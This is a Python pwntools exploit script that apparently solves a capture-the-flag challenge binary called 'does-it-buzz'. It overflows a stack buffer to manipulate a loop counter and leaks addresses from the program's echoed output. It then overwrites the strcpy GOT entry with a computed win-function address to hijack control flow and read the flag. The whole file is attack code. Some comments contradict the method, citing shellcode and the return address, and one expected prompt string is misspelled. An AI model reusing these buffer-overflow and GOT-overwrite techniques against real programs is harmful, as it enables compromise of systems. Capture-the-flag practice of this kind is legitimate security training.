from pwn import *

p = process("/challenge/does-it-buzz")

p.recvuntil(b"0:")  # Fixed: bytes literal

first_payload = b"A" * 64               # overwrite the buffer (4 bytes) up to loop counter
# set the loop counter (ustack_24) to negative number -11 to stay in the loop 
# this will make sure the local_20 get the address of local_30 in the next iteration to be -5
first_payload += p32(0xfffffff5)

p.send(first_payload)

p.recvuntil("You entered: ", timeout = 1)
output = p.recvline()

# Fixed: Handle binary data properly without eval
try:
    result = output.decode('utf-8', errors='ignore').strip()
except:
    result = output #.hex()  # Fallback to hex if decode fails
print(f"SECOND OUTPUT: {output}")

# Fixed: Extract bytes properly and ensure we have enough data
if len(output) >= 74:
    fizzbuzz_address_bytes = output[68:74]
    # Fixed: Pad to 8 bytes before converting to 64-bit integer
    fizzbuzz_address_value = u64(fizzbuzz_address_bytes.ljust(8, b'\x00'))
    print(f"fizzbuzz_address ==> local_20 ptr: {hex(fizzbuzz_address_value)}")
else:
    print(f"Output too short: {len(output)} bytes")
    fizzbuzz_address_value = 0  # Default value

#print(output)

output = p.recvuntil("Correct answer: FizzBuzz", timeout=2)
print(f"FIRST OUTPUT: {output}")

print("----------------------------------------------------------------------------------------")

second_payload = b"B" * 64          # arbitrary data just to go with the next iteration and copy the local_30 + 4 address to local_20 
second_payload += p32(0xfffffff5)
p.send(second_payload)

p.recvuntil(b"You entered: ", timeout=2)  # Fixed: bytes literal
output = p.recvline()

# Fixed: Handle binary data properly without eval
try:
    result = output.decode('utf-8', errors='ignore').strip()
except:
    result = output #.hex()  # Fallback to hex if decode fails
print(f"SECOND OUTPUT: {output}")

# Fixed: Extract bytes properly and ensure we have enough data
if len(output) >= 74:
    local_2c_address_bytes = output[68:74]
    # Fixed: Pad to 8 bytes before converting to 64-bit integer
    local_2c_address_value = u64(local_2c_address_bytes.ljust(8, b'\x00'))
    print(f"local_2c_address ==> local_20 ptr: {hex(local_2c_address_value)}")
else:
    print(f"Output too short: {len(output)} bytes")
    local_2c_address_value = 0  # Default value

output = p.recvuntil("Correct answer: ", timeout=2)
output2 = p.recvline()
print(output2)

print("----------------------------------------------------------------------------------------")

# Build the payload

exploitation_payload = b"C" * 56
exploitation_payload += p64(fizzbuzz_address_value - 0x2dcf)       # local_2c hold the address of win functionto be copied to the strcpy location in GOT to jump to
exploitation_payload += p32(0xfffffff6)                            # the loop counter should be at the edge to break the loop after the last iteration to execute the address
exploitation_payload += p64(local_2c_address_value)                # local_20 to be equal the address of local_2c (already did from previous step but just to fill the gap to read local_18)
exploitation_payload += p64(fizzbuzz_address_value - 0x70)         # local_18 to be equal the address of the strcpy in the GOT  

# the strcpy will copy the address of the buffer to the return address location to jump to execute the shellcode from the buffer

p.send(exploitation_payload)

p.recvuntil("You eneted: ", timeout=2)
output = p.recvline()
print(f"THIRD OUTPUT: {output}")
p.recvuntil("Correct answer: ", timeout=2)
output = p.recvline()
print(f"THIRD OUTPUT: {output}")

print("----------------------------------------------------------------------------------------")

p.send(b"flag")
output = p.recvall(timeout = 5)
print(f"FLAG: {output}")

p.interactive()
